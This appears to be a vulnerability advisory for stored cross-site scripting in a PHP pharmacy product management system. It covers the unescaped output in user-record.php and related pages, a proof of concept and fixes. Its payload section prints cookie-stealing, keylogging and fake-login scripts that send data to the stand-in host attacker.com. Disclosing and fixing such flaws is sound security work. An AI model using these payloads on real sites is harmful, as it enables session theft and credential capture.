

# Title: [xss] in [Web-based Pharmacy Product Management System] <= [v1.0]

# **BUG_Author:** [yaklang. io, IRify, Yakit]

## Product Information
- **Vendor Homepage:** [link](https://www.sourcecodester.com/php/17883/web-based-product-alert-system.html)
- **Software Link:** [download-link](https://www.sourcecodester.com/sites/default/files/download/Senior%20Walter/product_expiry.zip)
- **Affected Version:** [<= v1.0]
- **BUG Author:** yaklang. io, IRify 

## Vulnerability Details
### Vulnerable Files
* `user-record.php`
* `student-record.php`
* `sales-record.php`
* `edit-profile.php`
* `edit-photo.php`
* `changepassword.php`
* `backup_db.php`
* `add-supplier.php`
* `add-stock.php`
* `add-sales.php`
* `add-product.php`
* `add-category.php`
* `add-admin.php`
* `activity-log.php`

### Vulnerability Type
**Stored Cross-Site Scripting (XSS)**
*(CWE-79: Improper Neutralization of Input During Web Page Generation)*

### Root Cause
In this php file, we can find code like this: 
Search `login_email` in database, and show the `photo`  \ `fullname ` data from database. 
```php
// user-record.php
// line:10
$email = $_SESSION["login_email"];
//fetch user data
$stmt = $dbh->query("SELECT * FROM users where email='$email'");
$row_user = $stmt->fetch();

// line:134
    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      <div class="user-panel mt-3 pb-3 mb-3 d-flex">
        <div class="image">
        <img src="<?php echo $row_user['photo'];    ?>" alt="User Image" width="140" height="141" class="img-circle elevation-2">        </div>
        <div class="info">
          <a href="#" class="d-block"><?php echo $row_user['fullname'];  ?></a>
        </div>
      </div>
```
This `users` table we can control in `add-admin.php`, we can insert a new user to database, and when this user login, xss will be trigger in so many url. 

### Impact
- Persistent malicious script execution for all users viewing affected pages
- Session hijacking via cookie theft
- Phishing attacks by modifying page content
- Defacement of application interface
- Potential privilege escalation through admin interface compromise

## Description

### **Root Cause Analysis**
**Input Handling Flaws**:
   - User-controlled input (`fullname`, `photo` fields) is stored in database without sanitization
   - Output is directly rendered in multiple templates without proper escaping
**Attack Surface**:
   - 14 different PHP files display user-controlled data
   - Both admin and regular user interfaces affected
## **Attack Vectors**

### **Exploitation Paths**
1. **Basic Attack**:
   - Attacker creates account with malicious payload in `fullname` field
   - Payload executes when any user views affected pages

2. **Advanced Attack**:
   ```javascript
   <script>
   fetch('https://attacker.com/steal?cookie='+document.cookie);
   </script>
   ```

3. **DOM-based Variant**:
   ```javascript
   <img src=x onerror=alert(document.domain)>
   ```

### **Payload Examples**
1. **Session Hijacking**:
   ```html
   <script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
   ```

2. **Keylogger**:
   ```javascript
   <script>document.onkeypress=function(e){fetch('http://attacker.com/k?k='+e.key)};</script>
   ```

3. **UI Redress**:
   ```html
   <style>body{visibility:hidden}</style>
   <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white">
     <h1>System Maintenance</h1>
     <form action="http://attacker.com/phish" method="post">
       Enter credentials: <input type="password" name="creds">
     </form>
   </div>
   ```

## Code Scan 
this vulnerability find by [IRify](ssa.to) :
![image.png](https://s2.loli.net/2025/04/09/b3mtJocq2rQPuYy.png)



## Proof of Concept
We add the user with fullname: `<script>alert('XSS Exploit');</script>` 
![image.png](https://s2.loli.net/2025/04/09/olY96CJQq3VLHX4.png)


When we login this user, xss trigger: 
![image.png](https://s2.loli.net/2025/04/09/JDpXnrTscwuSxIm.png)

And in this user login,  we mark this php file, each can trigger this xss: 
![image.png](https://s2.loli.net/2025/04/09/VXd9B58NiHI2lkw.png)


## Suggested Repairs


### **Immediate Fixes**
1. **Output Encoding**:
   ```php
   // Replace all echo statements with:
   echo htmlspecialchars($row_user['fullname'], ENT_QUOTES, 'UTF-8');
   ```

2. **Input Validation**:
   ```php
   $fullname = preg_replace('/[^a-zA-Z0-9\s\-]/', '', $_POST['txtfullname']);
   ```

### **Architectural Improvements**
1. Implement Content Security Policy (CSP) headers:
   ```php
   header("Content-Security-Policy: default-src 'self'; script-src 'self'");
   ```

2. Adopt templating engine with auto-escaping (Twig, Blade)

3. Database layer sanitization:
   ```php
   $stmt = $dbh->prepare("INSERT INTO users (fullname) VALUES (?)");
   $stmt->execute([$filtered_fullname]);
   ```


## Additional Information

### **Technical Analysis**
- **Persistence**: Malicious payload remains until manually removed
- **Trigger Conditions**: Rendered in multiple contexts (HTML, JavaScript, attributes)
- **Browser Impact**: Affects all modern browsers

### **References**
1. OWASP XSS Prevention Cheat Sheet
2. CWE-79: Improper Neutralization of Input
3. PHP Security Best Practices

